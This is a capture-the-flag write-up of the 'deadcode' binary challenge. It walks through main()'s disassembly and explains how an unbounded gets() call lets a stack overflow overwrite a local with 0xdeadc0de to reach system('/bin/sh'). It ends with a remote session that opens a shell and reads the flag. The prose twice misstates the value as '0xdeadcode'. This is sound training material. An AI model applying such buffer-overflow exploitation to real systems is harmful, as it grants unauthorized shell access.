For this challenge, we are presented with a single binary named "deadcode". When we run it, we get the following output and it hangs waiting for user input.

```
$ ./deadcode 

I'm developing this new application in C, I've setup some code for the new features but it's not (a)live yet.

What features would you like to see in my app?
```

Here's the disassembly of the main() function.

```asm
┌ 114: main ();
│           ; var int64_t var_20h @ rbp-0x20
│           ; var int64_t var_8h @ rbp-0x8
│           0x00401195      55             push rbp
│           0x00401196      4889e5         mov rbp, rsp
│           0x00401199      4883ec20       sub rsp, 0x20
│           0x0040119d      48c745f80000.  mov qword [var_8h], 0
│           0x004011a5      b800000000     mov eax, 0
│           0x004011aa      e8a3ffffff     call sym.buffer_init
│           0x004011af      488d3d520e00.  lea rdi, qword str.I_m_developing_this_new_application_in_C__I_ve_setup_some_code_for_the_new_features_but_it_s_not__a_live_yet. ; 0x402008 ; "\nI'm developing this new application in C, I've setup some code for the new features but it's not (a)live yet."
│           0x004011b6      e875feffff     call sym.imp.puts
│           0x004011bb      488d3db60e00.  lea rdi, qword str.What_features_would_you_like_to_see_in_my_app ; 0x402078 ; "\nWhat features would you like to see in my app?"
│           0x004011c2      e869feffff     call sym.imp.puts
│           0x004011c7      488d45e0       lea rax, qword [var_20h]
│           0x004011cb      4889c7         mov rdi, rax
│           0x004011ce      b800000000     mov eax, 0
│           0x004011d3      e888feffff     call sym.imp.gets
│           0x004011d8      b8dec0adde     mov eax, 0xdeadc0de
│           0x004011dd      483945f8       cmp qword [var_8h], rax
│       ┌─< 0x004011e1      751d           jne 0x401200
│       │   0x004011e3      488d3dbe0e00.  lea rdi, qword str.Maybe_this_code_isn_t_so_dead... ; 0x4020a8 ; "\n\nMaybe this code isn't so dead..."
│       │   0x004011ea      e841feffff     call sym.imp.puts
│       │   0x004011ef      488d3dd50e00.  lea rdi, qword str.bin_sh   ; 0x4020cb ; "/bin/sh"
│       │   0x004011f6      b800000000     mov eax, 0
│       │   0x004011fb      e850feffff     call sym.imp.system
│       └─> 0x00401200      b800000000     mov eax, 0
│           0x00401205      c9             leave
└           0x00401206      c3             ret

```

In the prologue we can see that it's making 32 bytes (0x20) of space on the stack and then setting the last eight bytes to 0x0. Next it calls a buffer_init() function which disables buffering on standard input, standard out, and standard error which is commonly done in these types of problems. Next, it prints out the two lines we saw when we ran it by calling puts() twice. Next it calls gets() to read input from the user and stores it starting at the 32 byte space it made on the stack. Finally it checks to see whether the value represented by the last eight bytes of the space it made on the stack (and which it had previous set to 0x0) is equal to 0xdeadc0de and if not it jumps to the epilogue and exits. If the last eight bytes do contain that value, it falls through into code which prints out another string using puts() and then calls system("/bin/sh").

The gets() function reads user input until it encounters a newline character and there is no way for the programmer to limit the maximum amount of characters which the user sends before sending a newline character. Therefore, all that we need to do in order to write 0xdeadcode into the last eight bytes of the buffer is to send 24 characters of filler followed by the little-endian representation of the number 0xdeadcode.

Here's the output when run against the challenge server:

```
$ python deadcode.py REMOTE
[+] Opening connection to pwn-2021.duc.tf on port 31916: Done
[*] Switching to interactive mode


Maybe this code isn't so dead...
$ cat flag.txt
DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}
```

